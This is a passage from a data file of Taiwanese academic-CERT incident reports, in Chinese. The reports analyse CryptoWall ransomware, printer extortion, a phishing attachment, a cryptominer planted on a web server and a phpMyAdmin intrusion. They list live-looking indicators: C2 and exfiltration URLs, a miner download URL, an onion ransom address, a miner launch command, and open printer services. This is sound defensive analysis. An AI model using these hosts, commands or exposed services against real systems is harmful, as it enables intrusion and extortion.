四個檔案,主要內容是引導後害者如何進行繳付勒索贖金。 6. 惡意程式執行後會自動開啟HELP_DECRYPT.HTML 網頁檔案以及 HELP_DERCRYPT.TXT 文字檔案,並其內容都是告知使用者檔案已經被加 密,並且要求贖金才能夠取回檔案。  3 7. 從跳出的訊息得知該惡意程式應為知名的 CryptoWall 3.0,是 Cryptolocker 的改良版本,駭客宣稱文檔的加密技術是使用RSA-2048 的方式加密,並且必須透過提供的網址去付贖金以取得解密的私鑰",
        "Page_Num": "1,2,3,4"
    },
    "522": {
        "File_Name": "個案分析-綁架勒索電腦檔案的惡意程式事件分析報告_10409.pdf",
        "content": ",否 則無法復原檔案。 8. 嘗試連到顯示的贖金頁面,無法直接透過瀏覽器開啟,因為網址並非正 式的網域名稱,無法用一般的DNS 去解析出來。 9. 必須透過所謂的Tor 洋蔥瀏覽器去開啟惡意網址  4 「6i3cb6owitcouepv.onion/1figm5j」才能成功,因為該瀏覽器會透過 代理伺服器的中繼站IP 對外連線,所以也無法反向追查到駭客真正的位 置。 10.透過Tor Browser 開啟「6i3cb6owitcouepv.onion/1figm5j」後,會先 出現輸入圖形驗證碼的程序,才能進入解碼的服務頁面。 11.驗證碼通過後出現付款頁面,secret key 的售價為500 美金,並且有限 定在7 天之後付款的話,價格將提升為1000 美金,也就是30000 多台 幣。並且支付方式只接受Bitcoin,因此底下還提供了一些比特幣交易 所的網站,透過Bitcoin 支付贖金駭客就能夠規避檢調單位的追查,故 也容易成為犯罪的工具。  5 12.支付頁面底下有提供駭客用的Bitcoin 帳號,一旦支付出去就無法追討 回來,bitcoin address 都是透過電子錢包私鑰產生,也無法知道帳號 擁有者身分。 13.Tor Browser 連線的位址167.114.227.181:993 為中繼網路的其中一個 主機,從本地端無法明確追查到惡意網址,故Tor onion network 常用 來作為犯罪匿名網路使用。  6 14.從網路封包中可以看到,主機感染惡意程式一開始會連到網站 「http://ip-addr.es」,IP 為荷蘭188.165.164.184,該網站會回覆連 線主機的IP 資訊,可能是作為報到用途。 15.當主機報到完後svchost 會連到網址「obamairsscandal.com」,IP 為美 國184.106.75.112,並透過HTTP POST 將加密內容上傳至「/wp- content/themes/cc.php?q=15j4625tx4dwg5w」接收",
        "Page_Num": "4,5,6,7"
    },
    "523": {
        "File_Name": "個案分析-綁架勒索電腦檔案的惡意程式事件分析報告_10409.pdf",
        "content": ",研判可能是加密軟 體的私鑰。  7 16.該網址測試開啟為關於美國總統的醜聞資訊網站,可能被駭客利用來收 集受害主機的私鑰。 17.接下來svchost 會再連到網址「http://pictalo.com」,IP 為美國 45.55.161.127,透過 HTTP POST 方式將加密內容上傳至「/wp- content/plugins/woocommerce-one-click/vendor/stripe/stripe- php/lib/Error/ee.php?v=azw9uvgz8rbz」接收,加密內容可能是其他私 鑰,隨後網站會回覆一大串加密檔案,研判可能是勒索的贖金資訊。 18.測試開啟網址「http://pictalo.com」,且透過Virustotal 偵測出3/63 為惡意網址。  8 19.接著svchost 還會連到網址「http://mpc4u.co.uk」,IP 為英國 88.208.252.96,透過HTTP POST 方式將加密內容上傳至「/wp- includes/dd.php?f=e0tyx75ak4t24ic」接收,加密內容可能是其他私 鑰,成功後網站會回應「e14e91bd5fe07030」的加密字串。 20.測試開啟網址「http://mpc4u.co.uk」,會被防毒軟體警告為惡意網址, Virustotal 的偵測率為 6/63。  9 21.為了開啟贖金的網址「6i3cb6owitcouepv.onion/1figm5j」,必須透過 Tor browser 連到洋蔥(中繼)網路主機,此紀錄為法國IP 中繼代理 167.114.227.181:993,再透過代理主機去開啟真正的贖金網頁,故該網 頁無法被記錄到。  10 III. 網路架構圖 http://obamairsscandal.com 美國 184.106.75.112 受害使用者 http://ip-addr.es 荷蘭 188.165.164.184 STEP 2 感染回報 惡意程式 CryptoWall3.0 http://pictalo.com 美國 45.55.161.127 駭客 STEP 1 執行惡意程式 法國-中繼代理主機 167.114",
        "Page_Num": "7,8,9,10,11"
    },
    "524": {
        "File_Name": "個案分析-綁架勒索電腦檔案的惡意程式事件分析報告_10409.pdf",
        "content": ".227.181:993 STEP 5 Tor Browser 匿名網路 STEP 3 回傳加密私鑰1 STEP 4 回傳加密私鑰2 贖金網站 6i3cb6owitcouepv. onion/1figm5j STEP 6 支付Bitcoin STEP 7 接收Bitcoin STEP 8 解密私鑰贖回 持續監控主機 持續監控主機 1. 使用者可能透過APT 攻擊或誤執行網路上的惡意程式CTBLOCKER.exe。 2. 主機感染後向網站「ip-addr.es」回報IP 資訊。 3. 惡意程式開始加密主機內部檔案(可能是文件類),並回傳加密私鑰1。 4. 惡意程式開始加密主機內部檔案(可能是圖形類),並回傳加密私鑰2。 5. 受害者必須透過Tor Browser 進入洋蔥匿名網路,使用中繼代理主機。 6. 開啟了贖金網站,若是選擇付款則需要用Bitcoin 支付500USD。 7. 駭客收到Bitcoin 贖金後會將加密私鑰釋放出來給受害者。 8. 受害者利用駭客提供的私鑰工具進行檔案解密(無法保證成功)。 IV. 建議與總結 1. 使用者可能透過被APT 攻擊或網路下載執行到惡意程式而遭受感染。 2. 主機一旦被感染後,惡意程式會開始加密所有磁碟中的文件檔、圖片檔和影 音檔案。 3. 惡意程式一旦加密完各類檔案後會自我刪除,不讓使用者取得惡意程式。  11 4. 惡意程式隨後會跳出網頁和文件資訊,引導受害者如何去支付贖金來取得解 密私鑰。 5. CrytoWall 3.0 號稱使用RSA-2048 加密,因為沒有私鑰基本上是無法救回 檔案,建議使用者要定期備份重要資料避免無法挽回。 6. 理論上付了贖金給駭客,取得解密私鑰及工具就能解開。然而誰也無法保證 能成功救回檔案,可能導致檔案遺失又折損金錢。 7. 建議使用者將系統重新安裝,避免病毒遺留的影響往後可能再次發生。 8. 建議使用者將作業系統更新,並且更新常用套件如Adobe Flash Player、 Adobe Reader、Java 等,這些漏洞",
        "Page_Num": "11,12"
    },
    "525": {
        "File_Name": "個案分析-綁架勒索電腦檔案的惡意程式事件分析報告_10409.pdf",
        "content": "都有可能導致感染Cryptowall 勒索程 式。 ",
        "Page_Num": "12"
    },
    "526": {
        "File_Name": "個案分析-網路印表機之比特幣勒索信事件分析報告_10604.pdf",
        "content": "個案分析- 網路印表機之比特幣勒索信 事件事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 106 年4 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 殭屍網路Mirai 於2016 年9 月現身之後,造成全球網路世界開始發生好 幾起大規模IoT 設備的DDoS 攻擊事件,最高攻擊流量甚至超過1Tbps。 2. 接著2017 年2 月中開始,陸續有許多學校的網路印表機收到駭客恐嚇信, 要求支付0.05 和3 BTC 不等的比特幣,引起相關單位對IoT 設備資安的 高度重視。 3. 本次事件為某學校有一台網路印表機,大量收到要求支付0.05 BTC 給駭 客的恐嚇信造成使用者困擾,而該設備型號為「Fuji Xerox DocuPrint P455 d」。 4. 此恐嚇信內容很簡短,只表示該設備已經被駭入,並支付0.05BTC 到錢包 地址。 5. 該印表機使用者表示,當初安裝時候完全沒有做過任何設定,就連IP 都 是使用DHCP 取得的public IP,所以成為被駭入目標。 II. 事件檢測  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 1. 根據最近調查到許多學校遭駭的印表機廠牌以HP 比例73%為最大宗,然 而此事件設備廠牌為Fuji Xerox,表示不論廠牌大小都有可能被入侵。 2. 首先透過NMAP 對該設備進行 port scan,發現到印表機預設開啟許多 PORT,主要有port 21、23、80、9100 等常用通訊埠。 3. 首先檢查port 80 的網頁服務頁面,發現該網頁並無登入權限設定,任何 人都能夠輕易存取網頁管理頁面。在列印使用者限制權限方面,並無設定 任何限制,導致任何網段IP 都能夠存取到印表機。 4. 接著查看網站內容部分,裡面都是印表機組態設定功能項目,包含通訊協 定設定和",
        "Page_Num": "1,2,3"
    },
    "527": {
        "File_Name": "個案分析-網路印表機之比特幣勒索信事件分析報告_10604.pdf",
        "content": "安全性設定等,其中以安全性設定最為重要有ACL 功能,不過並 無特別設定。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 在檢查HTTP 服務功能中,並無直接上傳檔案列印功能,因此檢查FTP 服 務,發現能夠輕易以匿名帳號登入FTP 服務。 6. 在登入FTP 後,預設根目錄為 Root 資料夾,並且能夠上傳任意檔案。測 試上傳一個文字檔 0.txt,該檔案傳輸完成後就會被自動清除,在檢查 Web 的工作頁面可以看到文件正在列印中的顯示。 7. 此外透過作業系統新增印表機也能跨網段將該印表機加入連線,如此一來 更容易將恐嚇信透過 port 9100 方式將恐嚇信列印出。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 檢查WEB 介面的列印工作紀錄,發現在3/5 期間有大量透過port 9100 列印的紀錄,符合當時列印出恐嚇勒索信的時間。 9. 此外測試port 23 的telnet 連線,也能夠輕易成功登入,因為預設的密 碼為空。在此雖無法直接列印文件,但是能夠對網路相關組態進行設定, 包含IP 和ACL 設定等。 10. 接著分析側錄的封包發現,有大量的外部IP 針對印表機的 TELNET 和HTTP 服務進行連線,其中一筆韓國IP 115.160.86.2 成功連入印表機的TELNET 後,嘗試執行shell 指令及測試是否為MIRAI botnet,然而該介面無法 回應shell 指令執行。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 11. 接著檢查封包發現有IP 27.57.172.158 成功連入FTP 服務,並且嘗試上 傳ZIP 檔、執行檔和其他檔案來植入後門惡意程式,研判駭客也有可能繞 過port 9100 使用FTP 方式列印恐嚇勒索信。 III. 網路架構圖  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 駭客 STEP 2 列印",
        "Page_Num": "3,4,5,6,7"
    },
    "528": {
        "File_Name": "個案分析-網路印表機之比特幣勒索信事件分析報告_10604.pdf",
        "content": "恐嚇勒索信 STEP 1 HTTP、FTP、TELNET、 port 9100 連入印表機 IoT 未設權限的印表機 恐嚇勒索信 Step 1: 駭客從 Internet 透過 port 9100 或 FTP 連入網路印 表機。 Step 2: 印表機收到駭客上傳的文件後列印出恐嚇勒索信要求 支付贖金0.05BTC。 Step 3: 必須啟動印表機的防護機制,以免遭外人惡意利用。 IV. 建議與總結 1. 此事件為物聯網設備IoT 遭駭客入侵利用所致,主因是該設備並無設定防 護機制遭駭客利用列印恐嚇勒索信。 2. 駭客可以透過FTP 及port 9100 直接存取印表機列印文件,故以亂槍打鳥 方式隨意發送恐嚇勒索信要求支付BTC 贖金。 3. 因此該設備除了阻擋port 9100 之外,FTP 也是可能被入侵的管道。 4. 印表機的TELNET 和HTTP 服務並未關閉和限制,可能遭駭客串改印表機的 網路設定等。 5. 解決方式可以設定印表機的ACL 規則,限制外部網段無法存取,或者將 IP 設定為內部虛擬IP,避免直接暴露在Internet 中。 6. 另一種解決方式不用改為虛擬IP,但是要把印表機的閘道IP 給清空,阻 斷到Internet 的通道。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team V. 相關報導 1. http://www.ithome.com.tw/news/111674 2. http://www.ithome.com.tw/news/112300 3. http://www.ithome.com.tw/news/112282  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team ",
        "Page_Num": "7,8,9"
    },
    "529": {
        "File_Name": "個案分析-網路釣魚攻擊事件分析報告_10807.pdf",
        "content": "網路釣魚攻擊事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2019 年7 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 2019/6/25 本中心收到一封來自某知名大學的信件,主旨為「要求報價(XX 大 學)UNI894/BU463」,為了解該信件之攻擊行為與對收件者之危害程度,本中 心進行信件檢測。 二、事件檢測 1. 首先,查看信件內容,信件內容提到這是來自某大學的問候,在某教授的指 導下,請收件者在2019 年6 月27 日當天或之前提供2019 年預算的報價。在 信件中有一個名為「要求報價25-06-2019-pdf」的zip 壓縮檔,該信件是以國 內某知名大學的名義發出,若收件者為其常聯絡的廠商或其他業界公司,則 收信者會點開此信件並開啟附件的可能性將大大增加。 2. 使用微軟的Message Header Analyzer 分析信件的網際網路標題,從Received headers 發現該信件由cvps10523477067.hostwindsdns.com(美國 IP:104.168.171.157)所寄出,非來自寄件者所在地台灣(.tw),表示寄件者名稱  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 是偽造的。 在其他Header 資訊方面,發現若收信者回信則會回覆至 41e7e96794e44c007edebc97801881aa@batono.ge 的信箱,而該信箱為 References 的五個參考信箱之一,而從References 發現這些信箱都是來自俄 羅斯(ru)與喬治亞(ge)。本信件的Message-ID 為 7f8b935baa66618911d956af5439fe95@某知名大學英文縮寫.edu.tw,偽裝為某 知名大學所發出的信件,而且該信件的重要性設定為最優先,吸引收信者開 啟信件。",
        "Page_Num": "1,2,3"
    },
    "530": {
        "File_Name": "個案分析-網路釣魚攻擊事件分析報告_10807.pdf",
        "content": " 3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 將信件的附件「要求報價25-06-2019.pdf.zip」解壓縮,發現解壓縮後原以為 是pdf 檔的檔案變成執行檔,若檢視時未設定視窗秀出副檔名,則使用者會 以為是pdf 檔而開啟它,這是一個常見的引誘使用者上當的小技巧。 檢視該執行檔的檔案內容,發現該檔案是在2007/2/20 6:42 建立的,但是存取 日期卻是1601/1/1 8:57,推測這些時間可能不是準確的,而在詳細資料內則 寫明產品名稱為GravisDextrosazone8,原始檔名為GravisSCURRIED.exe。 4. 在執行「要求報價25-06-2019.pdf.exe」後,發現該檔案在原所屬位置的資料 夾內消失。檢視背景程式運作情形,發現該程式在執行後產生一個與自己相  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 同名稱的程式來持續執行著,而且兩者的程式路徑相同,存在原所屬位置的 資料夾內,但是查看資料夾卻無任何檔案存在。 5. 當「要求報價25-06-2019.pdf.exe」執行時,整個受害主機的記憶體使用率逐 漸升高,佔用大多數的記憶體用量,最後系統會出現記憶體即將用盡的警訊。 6. 在C:\\使用者\\David\\AppData\\Roaming\\FDF8D2 資料夾內,發現程式 223797.exe,其檔案大小、修改日期、建立日期、存取日期與詳細資料等資 訊與程式「要求報價25-06-2019.pdf.exe」相同,推測兩者可能為相同程式。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 223797.exe 經Virustotal 檢測,其惡意比例為15/67,僅有15 家防毒公司的防 毒軟體可以檢測出它的存在。 觀察程式「要求報價25-06-2019.pdf.exe」執行後的行為,發現223797.exe 是 它所產生而且更名過的副本程式(PID:39",
        "Page_Num": "3,4,5,6"
    },
    "531": {
        "File_Name": "個案分析-網路釣魚攻擊事件分析報告_10807.pdf",
        "content": "96)。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 查看受測主機對外連線狀況,發現「要求報價25-06-2019.pdf.exe」執行時會 連線印度IP:103.195.185.115:80,而且是每隔幾分鐘持續連線。 8. 檢視主機連線印度IP:103.195.185.115 的封包內容,發現受測主機會POST http://www.rmsholidays.com/css/css/hygt/fre.php,來傳送受測主機名稱的資訊 給該IP,但該印度主機回傳File not found,推測fre.php 網頁可能已不在該印 度主機上。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 網址http://www.rmsholidays.com/css/css/hygt/fre.php 經virustotal 檢測,其惡意 比例為9/70,有9 家防毒軟體公司的防毒軟體認為fre.php 為惡意網頁,而有 4 家防毒軟體判定網址http://www.rmsholidays.com 為惡意網址。 9. 查看信件原始碼內容,發現該信件的最後面有5 個圖示的連結,這5 個圖示 會連線塞爾維亞IP:147.91.79.142 來秀出5 個圖檔(face.png、twit.png、 google-plus.png、linked-in.png 與 you.png),推測該信件可能是駭客由某個信 件範本修改完成的。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、事件攻擊行為示意圖  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 1.駭客以國內某知名大學名義散播釣魚信件。 2.收件者收信後解壓縮附件「要求報價25-06-2019.pdf.zip」,並開啟它。 3.收件者的主機開始執行「要求報價25-06-2019.pdf.exe」。 4.「要求報價25-06-2019.pdf.exe」執行後,主機會持續傳送主機資訊給印度",
        "Page_Num": "6,7,8,9,10"
    },
    "532": {
        "File_Name": "個案分析-網路釣魚攻擊事件分析報告_10807.pdf",
        "content": "IP:103.195.185.115:80。 5.「要求報價25-06-2019.pdf.exe」產生一個副本程式並更名為223797.exe,來代 替自己執行。 四、建議與總結 1. 本個案的攻擊手法為駭客以知名大學名義寄發網路釣魚的信件,企圖騙取 收信者的信任,而附件的壓縮檔「要求報價25-06-2019.pdf.zip」解開後使 用者看到的是含.PDF 的中文檔名,更容易降低收件者的警戒心。 2. 「要求報價25-06-2019.pdf.exe」執行後產生副本並更名為223797.exe,但 使用Process 偵測工具查看「要求報價25-06-2019.pdf.exe」的存放路徑, 無法看到它對應到223797.exe。因223797.exe 本身為隱藏檔,又存放位置 為C:\\系統使用者的隱藏資料夾,因此,使用者發現它的機率便大大降低。 3. 從信件的內容發現該信件有塞爾維亞的連結在信件底部,卻以中文撰寫信 件內容與以中文命名附件檔案,推測駭客可能以某信件範本來進行修改, 而本身對於中文與台灣的大學環境有一定程度的了解。 4. 對於本個案的攻擊手法有下列幾點建議措施,提供參考。 (1) 不要隨意開啟不明來源的信件或信件附檔。 (2) 定期更新防毒軟體的病毒碼,以利即時阻擋惡意程式的攻擊。 (3) 可疑的信件如需開啟,建議於虛擬機或其它備用主機上開啟較佳。 (4) 定期備份主機資料。 ",
        "Page_Num": "10"
    },
    "533": {
        "File_Name": "個案分析-網頁置換攻擊事件分析報告_10803.pdf",
        "content": "網頁置換攻擊事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2019 年3 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 本中心接獲某單位通報在2018/11/11 晚上11 點多發現所屬網站網頁遭受置 換,並且網站主機可能有被植入木馬,為了解網站主機之受害情形,本中心 進行檢測。 二、事件檢測 1. 首先,受害主機使用Windows server 2008 R2 Standard 作業系統,該主機的用 途為網站伺服器,而且該網站有開啟讓管理人員登入的平台,可從外部網路 直接連線此管理介面,將使得此管理者登入頁面容易成為駭客攻擊的對象。 2. 針對所有Web 登入紀錄進行分析,篩選登入來源紀錄,發現駭客IP 為 83.166.240.162(俄羅斯)與78.165.183.78(土耳其)。 3. 土耳其駭客在2018/11/11 凌晨00:10 入侵後,曾修改網站資料夾內index.php, 所用html 語言為tr(土耳其語)。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team index.php 為被置換的網頁,而且網頁會出現警告視窗,宣告版權屬於 AYYILDIZ TiM 的駭客組織,並告訴受害者該系統是被ExaTr 所駭入。 4. 土耳其駭客入侵後在2018/11/11 00:10 開始進行網頁置換,index.php/en 檔案 大小由14941 Bytes 變更為10486 Bytes。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 俄羅斯駭客於入侵後,在2017/12/20 展開攻擊,陸續存取多個惡意程式於網 頁所在資料夾路徑下,各程式功能簡述如下: 惡意程式名稱 惡意程式功能 mod_ariimageslider.php 程式內容呈現亂碼,無法辨識 hub.php 進行挖礦 mod_jbt_skinner.php 傳送參數、執行i0 與i2 區段程式碼 i0.php 持續執行load_all.jar i2.php 下載load_",
        "Page_Num": "1,2,3,4"
    },
    "534": {
        "File_Name": "個案分析-網頁置換攻擊事件分析報告_10803.pdf",
        "content": "all.jar load_all.jar 對外大量連線主機群80port 6. hub.php 會至http://google-statik.pw/mainer/xmrig 下載挖礦程式,並且連線捷 克IP:178.32.145.31 的礦池。 7. i0.php 與i2.php 內容由eval(gzuncompress(base64_decode(亂碼)))組成,需要進 行解碼才可以看到其程式碼內容。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 進行解碼過程中看到程式註解內容為網路上常見的黃色笑話。 i0.php 解碼後發現load_all.jar 會不中斷地執行著。 i2.php 解碼後發現會下載load_all.jar 至主機內。 將i0.php 與i2.php 之程式碼整合後,其內容與mod_jbt_skinner.php 之程式碼 幾乎相同。 8. mod_jbt_skinner.php 之i0 與i2 區段程式會下載load_all.jar 來不中斷地執行, 並且傳送http://83.166.243.65/b 參數給load_all.jar 使用。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 9. 將load_all.jar 下載後執行,發現執行時CPU 資源會達到100%,而且會大量 對外連線許多IP 的80 port。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team load_all.jar 經Virustotal 檢測,其惡意比例為10/58,有多家防毒軟體公司的防 毒軟體無法檢測出它的存在。 10. 查看側錄封包,發現load_all.jar 執行後會連線這些IP 的downloader 資料夾, 並且傳送user 名稱與password 的資訊給對方。 11. 從側錄封包發現load_all.jar 會傳送資料給俄羅斯IP:83.166.240.236。 三、事件攻擊行為示",
        "Page_Num": "4,5,6,7,8"
    },
    "535": {
        "File_Name": "個案分析-網頁置換攻擊事件分析報告_10803.pdf",
        "content": "意圖 本個案之事件攻擊行為分為土耳其駭客與俄羅斯駭客兩種攻擊行為,分別 敘述如下。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 1.土耳其駭客 (1)從Web 駭入網站。 (2)將網站首頁置換成駭客網頁。 2.俄羅斯駭客 (1)從Web 駭入網站。 (2)存取mod_ariimageslider.php。 (3)存取hub.php 進行挖礦。 (4)存取mod_jbt_skinner.php(執行i0 與i2 區段程式碼)與i0.php 來執行 load_all.jar。 (5)大量連線主機群的80 port。 四、建議與總結 1. 本網頁置換個案是因土耳其IP:78.165.183.78 在2018/11/11 凌晨00:10 將 首頁置換造成。 2. 另一個俄羅斯IP:83.166.240.162 自2017/12/20 起陸續大量存取 mod_ariimageslider.php、mod_jbt_skinner.php、hub.php 與i0.php 等惡意檔  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 案。 3. 執行i0.php 與i2.php 產生的load_all.jar,在執行時會大量對外連線一些IP 的80 port,並且傳送資料給俄羅斯IP,目前大多數的防毒軟體尚無法檢 測出load_all.jar 檔案的惡意行為。 4. 針對本個案的資安防護與處理作業,提供幾點建議如下。 (1) 加強網站管理者的密碼強度,並且定期更新密碼。 (2) 控管網站目錄的使用者存取權限。 (3) 限制由使用者上傳至網站伺服器的檔案類型。 (4) 不定時查看網站資料夾之程式檔是否有異常。 (5) 定期更新網站系統程式與修補漏洞。 (6) 監控網路連線狀況,如發現單一IP 異常連線行為可確認其連線內容。 ",
        "Page_Num": "8,9,10"
    },
    "536": {
        "File_Name": "個案分析-虛擬幣挖礦惡意程式事件_10304.pdf",
        "content": "個案分析- 虛擬幣挖礦惡意程式事件 分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2014/04  1 I. 事件經過: A. 屏東縣H國小在同一月分內特定IP 不斷被開立相同的INT 資安事件單, 經本單位詢問該校資安聯絡人原因為負責人技術上無法處理,故本單位協 助鑑識檢測。 B. 該主機的作業系統為Windows Server 2008,主要是學校的官方網站伺服 器使用。 II. 事件檢測: A. 因為是網站伺服器,故先檢查所使用的WEB 軟體,發現是安裝Appserv 的套裝軟體,且存在漏洞 /phpmyadmin/scripts/setup.php 也可被外部存取 的,故駭客可能藉由此漏洞植入後門程式。 B. 因為是透過遠端桌面軟體協助,無法實體側錄封包。直接於主機上安裝封 包側錄軟體時會無法成功執行,似乎是內部有惡意程式在防止側錄軟體的 使用。 C. 透過Procexp 能夠發現到一些可疑的程式於背景執行。其中原有的 httpd.exe為Apache的Web服務,然而底下許多子程式為惡意程式所開啟。  2 1. 該主機使用Appserv 的Web server 套件,內含有舊版本的PhpMyAdmin 容易成為駭客入侵的漏洞,因無須權限就能存取 /www/phpmyadmin/scripts/setup.php 以植入後門。 2. 從此處能看到apache 版本為2.2.8.0,並且是有安裝Appserv 的套裝軟 體,故駭客能從phpmyadmin 的漏洞進入。  3 3. 由cmd.exe 所執行的指令發現,會去執行一個惡意程式miner.bat 的批 次檔 「cmd.exe /c “miner.bat” arg1」,且執行所在為暫存的隱藏資料夾 中。 4. 編輯Miner.bat 的內容可發現到,其實是執行了同資料夾的genuine.exe, 後面帶有特定參數網址和port 3334,此為線上虛擬貨幣 萊特幣 (Litecoin)的挖礦池,表示此",
        "Page_Num": "1,2,3,4"
    },
    "537": {
        "File_Name": "個案分析-虛擬幣挖礦惡意程式事件_10304.pdf",
        "content": "程式在執行貨幣挖礦動作並將成果傳給駭 客的帳戶 bkdscn.windows 。 a. 透過virustotal 線上掃毒,genuine.exe 被大多防毒判定為 BitCoinMiner 的惡意程式,偵測比例為37/49。 b. 此萊特幣的礦池為 eu-1.liteguardian.com,IP 是178.32.41.39,位於 巴拿馬的合法註冊網站。  4 c. 轉載自維基百科: http://zh.wikipedia.org/wiki/%E8%8E%B1%E7%89%B9%E5%B8%8 1 萊特幣(英語:Litecoin,簡寫:LTC,貨幣符號:Ł)是一種點對 點的電子貨幣,也是MIT/X11 許可下的一個開源軟體項目。[1]萊 特幣受到了比特幣(BTC)的啟發,並且在技術上具有相同的實現 原理[2],萊特幣的創造和轉讓基於一種開源的加密協議,不受到 任何中央機構的管理。 D. 檢查挖礦程式所連線的網站https://www.liteguardian.com/ 的確為LTC 萊 特幣(Litecoin)的礦池網站(Mining Pool) LiteGuardian,此網站採封閉會員 邀請註冊。  5 E. 在系統暫存目錄下有其他可疑程式 start.bat,檢視其內容可以知道正式呼 叫genuine.exe 的批次檔。內有genuine.exe 的安裝路徑,並寫入開機執行 註冊碼中,並使用cmd 去執行的指令參數。 F. 檢查非系統槽發現到可疑程式gaoz.exe 為一個自解壓縮包,解開後內有 start.bat、genuine.exe、chp.exe 及miner.bat 等相關檔案,故能判定此壓縮 包為駭客用來植入虛擬幣挖礦程式所使用。如此得知駭客也已經能夠存取 其他磁槽的資料。 G. 檢查通訊埠狀態可以看到TCP port 6667 為開啟,為事件單開立主要原因 “IRC Join From Server”,可能為駭客用來下達指令的",
        "Page_Num": "4,5,6"
    },
    "538": {
        "File_Name": "個案分析-虛擬幣挖礦惡意程式事件_10304.pdf",
        "content": "通訊埠。 H. 在系統槽內還發現到幾個可疑程式,其中ddos.exe 可能為駭客用來發動 DDOS 攻擊的指令,執行後會產生惡意程序spoolsv 持續向 IP 95.64.38.108:6667 發送大量TCP SYN 封包。 I. 另有檔案stop.exe 為用來停止genuine.exe 挖礦程式的指令,而駭客遠端遙 控的通訊埠就是透過IRC port 6667 所執行。 J. 使用port 6667的程式發現是偽裝成系統檔的 lsass.exe,位於暫存目錄下, 會連到IP 位置62.24.103.148 的port 6667。  6 1. 追查發現該IP 是位於非洲「肯亞」的一台Web server,使用的是 WampServer 套件架設,疑似為一台C&C server 用來下達DDOS 指令 給底層殭屍電腦。 註:WAMP 是代表Windows+Apache+MySQL+PHP,還內建MySQL 管理工具PhpMyAdmin 及SqlBuddy 等軟體。 K. 此事件單被開立主要是 “IRC_Join_From_Server”的特徵行為。從事件佐證 資料能發現惡意程式也連其他上層C&C 主機,IP 為 146.0.79.165 及 192.71.151.187。 IRC Join From Server 目的端 IP 通訊埠 國家 146.0.79.165 6667 紐西蘭 192.71.151.187 6667 瑞典  7 62.24.103.148 6667 肯亞 III. 側錄流量分析 A. 觀察 miner.bat 執行後產生的挖礦程式網路封包,可以看到軟體一開始會 向礦池主機178.32.41.39 進行登入報到,並且傳送挖礦軟體的版本 “cpuminer/2.3.2”,此軟體採用CPU 資源進行運算。 B. 封包內容帶有參數 “bkdscn.windows” ,此為駭客的虛擬幣Litecoin 的帳戶 名稱。伺服器端確認後回傳參數 “result”: true 表示認證成功。 IV",
        "Page_Num": "6,7,8"
    },
    "539": {
        "File_Name": "個案分析-虛擬幣挖礦惡意程式事件_10304.pdf",
        "content": ". 事件網路架構圖  8 Internet Hacker STEP 1 : Web Server被駭客利用 phpMyAdmin漏洞植入後門。 STEP 2 : 感染主機被植入挖礦後門程式執行虛擬幣Hash運算至礦池。 STEP 3 : 虛擬幣礦池主機將得到的虛擬幣存入駭客帳戶。 STEP 4 : 感染主機同時也被植入ddos.exe的後門程式並透過IRC接受指令攻擊。 STEP 5 : 感染主機收到駭客指令執行DDOS攻擊外部主機。 STEP 2 挖礦後門程式 STEP 4 IRC 通訊 IRC Servers 虛擬幣礦池 STEP 1 植入後門 Web Server STEP 3 存入虛擬幣帳戶 STEP 5.2 執行DDOS 攻擊 STEP 5.1 DDOS 攻擊指令 95.64.38.108:6667 146.0.79.165 :6667 192.71.151.187 :6667 62.24.103.148 :6667 V. 總結 A. 此事件駭客主要透過 PhpMyAdmin/scripts/setup.php 漏洞植入後門程式。 B. 其中主要被駭客植入虛擬貨幣的挖礦程式,來替駭客挖礦(雜湊運算)賺取 利益。 C. 挖礦程式(Miner)在運行中會耗損大量CPU 或者記憶體資源,導致電腦效 能降低。 D. 若駭客透過該主機發動SYN Flood (DDoS)攻擊其他主機時,電腦或網路 效能都可能受到影響。 VI. 建議措施 A. 安裝Appserv 套件時候務必檢查 phpmyadmin 下是否有setup.php,將之移 除避免外部存取入侵。 B. 務必安裝防毒軟體提升防護。 C. 可以透過tcpview 檢測是否有可以流量或特定連接埠(port 6667)被開啟連 線。 D. 使用procexp 或工作管理員檢查有無不明程式占用大量CPU 或記憶體資 源,並檢測其檔案路徑是否正確或是偽裝程式。 ",
        "Page_Num": "8,9"
    },
    "540": {
        "File_Name": "個案分析-資訊竊取木馬 Agent Tesla 分析報告.pdf",
